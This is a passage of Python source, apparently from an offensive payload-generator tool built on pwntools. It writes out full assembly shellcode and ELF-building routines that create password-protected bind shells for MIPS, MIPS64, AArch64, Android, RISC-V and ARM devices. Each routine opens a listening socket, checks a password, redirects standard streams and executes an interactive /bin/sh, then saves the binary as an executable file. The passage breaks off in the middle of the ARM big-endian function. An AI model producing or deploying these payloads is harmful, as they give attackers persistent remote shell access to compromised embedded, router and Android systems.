	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	#passwd_high = passwd[:6]
	#passwd_low  = "0x"+passwd[6:10]
	shellcode = shellcraft.socket(2,2,0)
	shellcode +='''
	addiu  $sp,$sp,-32
	li $t7,0x7350
	andi   $s0, $v0, 0xffff
	addiu  $t6, $zero, -0x11
	not    $t6, $t6
	addiu  $t5, $zero, 0x2
	sllv   $t5, $t5, $t6
	addiu  $s4, $zero, %s
	or     $t5, $t5, $s4
	sw     $t5, -0x20($sp)
	sw     $zero, -0x1c($sp)
	sw     $zero, -0x18($sp)
	sw     $zero, -0x14($sp)
	or     $a0, $s0, $s0
	addiu  $t6, $zero, -0x11
	not    $a2, $t6
	addi   $a1, $sp, -0x20
	addiu  $v0, $zero, 0x1049
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	addiu  $a1, $zero, 0x101
	addiu  $v0, $zero, 0x104e
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, -1
	slti   $a2, $zero, -1
	addiu  $v0, $zero, 0x1048
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	andi   $s0, $v0, 0xffff
	or     $a0, $s0, $s0
	addiu  $t7, $zero, -3
	not    $a1, $t7
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, 0x101
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, -1
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	'''
	#print(passwd)
	shellcode = shellcode%(listen_port)
	shellcode = asm(shellcode)
	shellcode += asm(shellcraft.write("$s0","Passwd: ",8))
	shellcode += asm("addiu  $sp, $sp, -0x40")
	shellcode += asm(shellcraft.read("$s0","$sp",passwd_len))
	shellcode += asm("li $s3, %s\nlw $s1, ($sp)"%(passwd))+b"\x18\x20\x71\x16"[::-1]
	shellcode += asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	#shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
aarch64 aarch64_bind_shell

add 2022.11.2
'''
def aarch64_bind_shell(listen_port, passwd, filename = None):
	context.arch = 'aarch64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd_high = passwd[:6]
	passwd_high2 = '0x'+passwd[6:10]
	passwd_low = '0x' + passwd[10:14]
	passwd_low2 = '0x' + passwd[14:]
	shellcode = '''
	mov x8, #198
	lsr x1, x8, #7
	lsl x0, x1, #1
	mov x2, xzr
	svc #0x1337
	mvn x4, x0
	'''
	shellcode += '''
	lsl  x1, x1, #1
	movk x1, #%s , lsl #16
	str  x1, [sp, #-8]!
	add  x1, sp, x2
	mov  x2, #16
	mov  x8, #200
	svc #0x1337

	mvn  x0, x4
	lsr  x1, x2, #3
	mov  x8, #201
	svc #0x1337
	mov x5, x1

	mvn  x0, x4
	mov  x1, xzr
	mov  x2, xzr
	mov  x8, #202
	svc  #0x1337


	mvn  x4, x0
	lsl  x1, x5, #1
	mvn  x4, x0
	lsr  x1, x1, #1
	mov  x2, xzr
	mov  x8, #24
	svc  #0x1337
	mov  x10, xzr
	cmp  x10, x1
	bne  -0x18
	mov  x14, #24912
	movk x14, #29555, lsl #16
	movk x14, #25719, lsl #0x20
	movk x14, #8250, lsl #0x30
	mov  x15, xzr
	sub  sp, sp, #8
	stp x14, x15, [sp, #-16]!
	mov  x1, sp
	mvn  x0, x4
	mov  x2, #8
	/* call write() */
	mov  x8, #SYS_write
	svc 0

	sub sp, sp, 0x30
	mvn x0, x4
	mov x1, sp
	mov x2, #%s
	mov x8, #0x3f
	svc #0x1337

	mov x14, #%s
	movk x14, #%s , lsl #16
	movk x14, #%s , lsl #0x20
	movk x14, #%s , lsl #0x30

	ldr x15, [sp,#0]!
	cmp x15, x14
	bne 0x1888
	'''
	shellcode += '''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

	'''
	shellcode = asm(shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high))
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
2022.11.8 add
bind 0x13b8
accept 0x13b2
listem 0x13b9
socket number v0=0x13b0
connect number v0=0x13b1
dup2  number v0=0x13A8
execve number v0=0x13c1
'''
def mips64el_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'mips64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	shellcode = '''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	li      $t3,0x7350
	andi    $s0,$v0,0xffff
	li      $t2,-17
	nor     $t2,$t2,$zero
	li      $t1, %s
	sllv    $t1,$t1,$t2
	li      $t2,-3
	nor     $t2,$t2,$zero
	or      $t1,$t1,$t2
	sw      $t1,-32($sp)
	sw      $zero,-28($sp)
	sw      $zero,-24($sp)
	sw      $zero,-20($sp)
	or      $a0,$s0,$s0
	li      $t2,-17
	nor     $a2,$t2,$zero
	daddi   $a1,$sp,-32
	li      $v0,0x13b8
	syscall 0x40404
	li      $t3,0x7350
	or      $a0,$s0,$s0 
	li      $a1,2
	li      $v0,0x13b9
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,-1
	slti    $a2,$zero,-1
	li      $v0,0x13b2
	syscall 
	li      $t3,0x7350
	andi    $s0,$v0,0xffff
	or      $a0,$s0,$s0 
	li      $t2,-3 
	nor     $a1,$t2,$zero 
	li      $v0,0x13a8
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,0x0101
	li      $v0,0x13a8
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,-1
	li      $v0,0x13a8
	syscall
	'''
	shellcode_execve='''
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404
	'''
	shellcode = shellcode%(listen_port) + shellcode_execve
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def mips64_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'mips64'
	context.endian = 'big'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	shellcode = '''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	li      $t3,0x7350
	andi    $s0,$v0,0xffff
	li      $t2,-17
	nor     $t2,$t2,$zero
	li      $t1, -3
	nor     $t1,$t1,$zero
	sllv    $t1,$t1,$t2
	li      $t2,%s
	or      $t1,$t1,$t2
	sw      $t1,-32($sp)
	sw      $zero,-28($sp)
	sw      $zero,-24($sp)
	sw      $zero,-20($sp)
	or      $a0,$s0,$s0
	li      $t2,-17
	nor     $a2,$t2,$zero
	daddi   $a1,$sp,-32
	li      $v0,0x13b8
	syscall 0x40404
	li      $t3,0x7350
	or      $a0,$s0,$s0 
	li      $a1,2
	li      $v0,0x13b9
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,-1
	slti    $a2,$zero,-1
	li      $v0,0x13b2
	syscall 
	li      $t3,0x7350
	andi    $s0,$v0,0xffff
	or      $a0,$s0,$s0 
	li      $t2,-3 
	nor     $a1,$t2,$zero 
	li      $v0,0x13a8
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,0x0101
	li      $v0,0x13a8
	syscall
	li      $t3,0x7350
	or      $a0,$s0,$s0
	slti    $a1,$zero,-1
	li      $v0,0x13a8
	syscall
	'''
	shellcode_execve='''
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -8($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -12($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0,0x13c1
	syscall 0x40404
	'''
	shellcode = shellcode%(listen_port) + shellcode_execve
	shellcode = asm(shellcode)
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def android_aarch64_bindshell(listen_port, passwd, filename):
	context.arch = 'aarch64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd_high = passwd[:6]
	passwd_high2 = '0x'+passwd[6:10]
	passwd_low = '0x' + passwd[10:14]
	passwd_low2 = '0x' + passwd[14:]
	shellcode = '''
	mov x8, #198
	lsr x1, x8, #7
	lsl x0, x1, #1
	mov x2, xzr
	svc #0x1337
	mvn x4, x0
	'''
	shellcode += '''
	lsl  x1, x1, #1
	movk x1, #%s , lsl #16
	str  x1, [sp, #-8]!
	add  x1, sp, x2
	mov  x2, #16
	mov  x8, #200
	svc #0x1337

	mvn  x0, x4
	lsr  x1, x2, #3
	mov  x8, #201
	svc #0x1337
	mov x5, x1

	mvn  x0, x4
	mov  x1, xzr
	mov  x2, xzr
	mov  x8, #202
	svc  #0x1337


	mvn  x4, x0
	lsl  x1, x5, #1
	mvn  x4, x0
	lsr  x1, x1, #1
	mov  x2, xzr
	mov  x8, #24
	svc  #0x1337
	mov  x10, xzr
	cmp  x10, x1
	bne  -0x18
	mov  x14, #24912
	movk x14, #29555, lsl #16
	movk x14, #25719, lsl #0x20
	movk x14, #8250, lsl #0x30
	mov  x15, xzr
	sub  sp, sp, #8
	stp x14, x15, [sp, #-16]!
	mov  x1, sp
	mvn  x0, x4
	mov  x2, #8
	/* call write() */
	mov  x8, #SYS_write
	svc 0

	sub sp, sp, 0x30
	mvn x0, x4
	mov x1, sp
	mov x2, #%s
	mov x8, #0x3f
	svc #0x1337

	mov x14, #%s
	movk x14, #%s , lsl #16
	movk x14, #%s , lsl #0x20
	movk x14, #%s , lsl #0x30

	ldr x15, [sp,#0]!
	cmp x15, x14
	bne 0x1888
	'''


	shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #16
add x14, sp, x14
sub sp, sp, 8

str x14, [sp, #-8]! /* b'/bin/sh\x00' */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

	'''
	shellcode = shellcode + shellcode_execve
	shellcode = asm(shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high))
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 






'''
0xc8 bind
0xc9 listen
0xca accept
0xd0 setsockopt
0x24 dup2
0x40 wirte
0x3f read

'''


def riscv64el_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'riscv'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port="0x"+enhex(p16(listen_port))+"0002"
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
li  a0,2
li  a1,1
li  a2,0
li  a7,0xc6
ecall
mv  a6, a0
li  s1, %s
sd  s1,-16(sp)
li  s1, 0
sd  s1, -8(sp)
add a1,sp,-16
li  a2, 0x10
li  a7, 0xc8
ecall
mv  a0, a6
li  a1, 0x2
li  a7, 0xc9
ecall
mv  a0, a6
li  a1, 0
li  a2, 0
li  a7, 0xca
ecall

mv  a6, a0
li  a1, 0
li  a2, 0
li  a7, 24
ecall

mv  a0, a6
li  a1, 1
li  a2, 0
li  a7, 24
ecall

mv  a0, a6
li  a1, 2
li  a2, 0
li  a7, 24
ecall

add sp, sp, -0x20
li  s1, 0x203a647773736150
sd  s1, 0(sp)
add  a1, sp, 0
mv  a0, a6
li  a2, 8
li  a7, 0x40
ecall

li  s9, %s

add sp, sp, -0x40
mv  a1, sp
mv  a0, a6
li  a2, %s
li  a7, 0x3f
ecall

ld  s8, 0(sp)
sext.w s8, s8
sext.w s9, s9
bne    s8, s9, main_exit
	'''

	shellcode = shellcode%(listen_port, passwd, passwd_len)

	shellcode += '''
li s1, 0x68732f2f6e69622f
sd s1, -48(sp)
li s1, 0x692d
sd s1, -64(sp)
addi a0,sp,-48
sd a0, -16(sp)
addi a5,sp,-64
sd a5, -8(sp)
sd zero, 0(sp)
addi a1,sp,-16
slt a2,zero,-1 
li a7, 221
ecall
		'''
	
	shellcode +='''
main_exit:
li a0, 0 
li a7, 0x53
ecall
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def armelv5_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	bind_shellcode = 'mov  r6, r0'
	for i in range(2):
		bind_shellcode += '''
		mov  r7,%d
		strb  r7,[sp,#-%d]
		'''%(p16(listen_port)[i], 0x60+i)
	bind_shellcode += '''
	strb r2,[sp, #-0x62]
	mov r7, #2
	strb r7,[sp, #-0x63]	
	ldr r7,[sp, #-0x63]
	push {r2}
	push {r7}
	'''

	passwd_len_int = len(passwd)
	passwd_len = hex(len(passwd))
	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	pass_cmd_shellcode = 'eor r7, r7, r7'

	if(passwd_len_int >0 and passwd_len_int <=4):
		for i in range(4-passwd_len_int):
			pass_cmd_shellcode += '''
			strb r7 , [sp, #-%d]
			'''%(0x80+i)

	for i in range(passwd_len_int):
		pass_cmd_shellcode += '''
		mov r7, #%d
		strb r7, [sp, #-%d]
		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))

	pass_cmd_shellcode += '''
	ldr r5, [sp, #-0x83]
	'''

	shellcode = '''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor  r4,r4,r4
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r8,sp,#-0x20
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	'''

	shellcode += '''
	mov  r0, #2
    mov  r1, #1
    eor  r2, r2 ,r2/* 0 (#0) */
    /* call socket() */
    mov r7, #SYS_socket /* 0x119 */
    svc  #0
	'''

	shellcode += bind_shellcode

	shellcode +='''
	mov  r1,sp
	mov  r2,#0x10  
	mov r7, 0x11a
	svc #0
	mov r0,r6
	eor r1,r1
	mov r7,#284
	svc #0
	mov r0,r6
	eor r2,r2
	mov r7, 0x11d
    svc #0
    mov r6,r0
	mov r7,#0x20
	strb r7,[sp,#-0x30]
	mov r7,#0x3a
	strb r7,[sp,#-0x31]
	mov r7,#0x64
	strb r7,[sp,#-0x32]
	mov r7,#0x77
	strb r7,[sp,#-0x33]
	mov r7,#0x73
	strb r7,[sp,#-0x34]
	mov r7,0x73
	strb r7,[sp,#-0x35]
	mov r7,0x61
	strb r7,[sp,#-0x36]
	mov r7,0x70
	strb r7,[sp,#-0x37]
	add r1,sp,-0x37
	mov r0,r6
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov  r7,sp
	ldr  r1,[r7]
	'''

	shellcode += pass_cmd_shellcode

	shellcode += '''
	cmp  r1,r5
	bne  main_exit
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	strb r2, [sp,#0x20]
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	shellcode = shellcode % ( passwd_len)


	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)


	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def armebv5_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'arm'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )

	l_p =p16(listen_port)[::-1]

	bind_shellcode = 'mov  r6, r0'
	for i in range(2):
		bind_shellcode += '''
		mov  r7,%d
		strb  r7,[sp,#-%d]
		'''%(l_p[i], 0x60+i)
	bind_shellcode += '''
	strb r2,[sp, #-0x63]
	mov r7, #2
	strb r7,[sp, #-0x62]	
	ldr r7,[sp, #-0x63]
	push {r2}
	push {r7}
	'''

	passwd_len_int = len(passwd)
	passwd_len = hex(len(passwd))
	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))[::-1]
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	pass_cmd_shellcode = 'eor r7, r7, r7'
	if(passwd_len_int >0 and passwd_len_int <=4):
		for i in range(4-passwd_len_int):
			pass_cmd_shellcode += '''
			strb r7 , [sp, #-%d]
			'''%(0x80+i)
	for i in range(passwd_len_int):
		pass_cmd_shellcode += '''
		mov r7, #%d
		strb r7, [sp, #-%d]
		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))

	pass_cmd_shellcode += '''
	ldr r5, [sp, #-0x83]
	'''


	shellcode = '''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor r4,r4,r4
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r8,sp,#-0x20
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	'''

	shellcode += '''
	mov  r0, #2
    mov  r1, #1
    eor  r2, r2 ,r2/* 0 (#0) */
    /* call socket() */
